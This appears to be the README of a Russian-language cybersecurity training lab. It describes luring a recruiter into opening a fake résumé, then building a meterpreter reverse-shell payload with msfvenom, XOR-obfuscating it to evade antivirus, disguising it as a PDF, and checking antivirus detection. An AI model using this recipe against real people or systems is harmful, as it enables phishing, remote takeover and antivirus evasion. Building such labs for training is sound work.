# cyberpolygon with virus for information security training

### Для работы стенда необходимо ввести след команды
![Image alt](https://github.com/diurs/Cyberpolygon/blob/main/Screenshot%20from%202022-07-05%2018-27-14.png)

### Сценарий

## Что делает хакер

Хакер ищет себе жертву, которой в дальнейшем отправит вредоносный файл. С помощью социальной инженерии злоумышленник находит одну компанию на hh и звонит рекрутеру. Общаясь он рассказывает, как заинтересован в работе. После их разговора, хакер обещает прислать денису на почту резюме. 
На деле же вместо резюме лежит заархивированный вредоносный файл.

## что делает hr

Кадровик Денис заходит на почту и видит примерно следующее сообщение, которое оставил ему его телефонный собеседник: 

“Здравствуйте еще раз! я заинтересован в вашей работе. Вот мое резюме” 
Его впечатлил телефонный разговор и он бежит побыстрее посмотреть его резюме.

![Screenshot](https://github.com/diurs/Cyberpolygon/blob/main/Screenshot%20from%202022-07-05%2018-36-50.png)

![Screenshot](https://github.com/diurs/Cyberpolygon/blob/main/Screenshot%20from%202022-07-05%2018-41-09.png)

Тем временем у атакующего включен meterpreter listener и он получает оболочку , тем самым имея возможность загрузить любые файлы и выполнить любой код. 

Чем он и пользуется, закидывая hr-ру файлик hacked.txt , в котором сообщается, что тот взломан

![Screenshot](https://github.com/diurs/Cyberpolygon/blob/main/Screenshot%20from%202022-07-05%2018-41-19.png)

Так выглядят Отработавшие скрипты HR:

![Screenshot](https://github.com/diurs/Cyberpolygon/blob/main/Screenshot%20from%202022-07-05%2018-41-34.png)


и hacker:

![Screenshot](https://github.com/diurs/Cyberpolygon/blob/main/Screenshot%20from%202022-07-05%2018-41-47.png)

## Описание созданного вируса

Вирус состоит из 2-х файлов : hack.c , encoder_beautiful.c 

Создадим переменную массива беззнаковых символов с именем buf, которая содержит наш шелл-код вывод в формате C из msfvenom. Это в будущем поможет нам получить оболочку и выполнять любые команды на компьютере жертвы.

Чтобы избежать обнаружения сканерами, мы замаскируем исходную строку шелл-кода. Мы можем сделать это, создав программу-кодировщик (encoder_beautiful) для выполнения операции XOR с нашей полезной нагрузкой meterpreter.

Затем мы возьмем выходные данные нашего кодировщика и заменим полезную нагрузку нашей исходной оболочки C на запутанную версию, которую мы создали. И добавим декодер XOR в нашу исходную программу на C, чтобы деобфусцировать полезную нагрузку в памяти перед ее выполнением.

#### Порядок команд для получения готового вируса

Сгенерируем 64-битный незакодированный шеллкод с помощью msfvenom с типом вывода «c» на Kali след. командой : 
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=443 -f c 
![Screenshot](https://github.com/diurs/Cyberpolygon/blob/main/Screenshot%20from%202022-07-05%2018-42-24.png)

Скопируем char buf[] и вставим это в программу encoder_beautiful.c
![Screenshot](https://github.com/diurs/Cyberpolygon/blob/main/Screenshot%20from%202022-07-05%2018-52-04.png)

Скомпилируем командой gcc encoder_beautiful.c -o encoder_beautiful.elf

запустим ./encoder_beautiful.elf - теперь это надо скопировать
![Screenshot](https://github.com/diurs/Cyberpolygon/blob/main/Screenshot%20from%202022-07-05%2018-52-17.png)

Затем мы вставим char buf[] в программу на C, которая будет действовать как оболочка для загрузки и запустит шеллкод.

Скомпилировать след. командой файл hack.c


![Screenshot](https://github.com/diurs/Cyberpolygon/blob/main/Screenshot%20from%202022-07-05%2018-52-40.png)


Получен готовый вирус, который необходимо закинуть жертве. Попробуем переименовать его вместо hack.elf в resume_for_hr.pdf

Настроим прослушиватель:

![Screenshot](https://github.com/diurs/Cyberpolygon/blob/main/Screenshot%20from%202022-07-05%2018-52-50.png)

Запустим:

![Screenshot](https://github.com/diurs/Cyberpolygon/blob/main/Screenshot%20from%202022-07-05%2018-53-00.png)


И получаем оболочку:

![Screenshot](https://github.com/diurs/Cyberpolygon/blob/main/Screenshot%20from%202022-07-05%2018-53-08.png)


## Результаты сканирования антивирусных систем

Анализ сканирования касперским нашего вредоносного файла hack.elf показал следующий результат :

![Screenshot](https://github.com/diurs/Cyberpolygon/blob/main/Screenshot%20from%202022-07-05%2018-53-26.png)


Анализ сканирования касперским нашего вредоносного файла resume.pdf показал следующий результат :

![Screenshot](https://github.com/diurs/Cyberpolygon/blob/main/Screenshot%20from%202022-07-05%2018-53-35.png)


Результат сканирования написанного вируса на virustotal :

![Screenshot](https://github.com/diurs/Cyberpolygon/blob/main/Screenshot%20from%202022-07-05%2018-53-55.png)


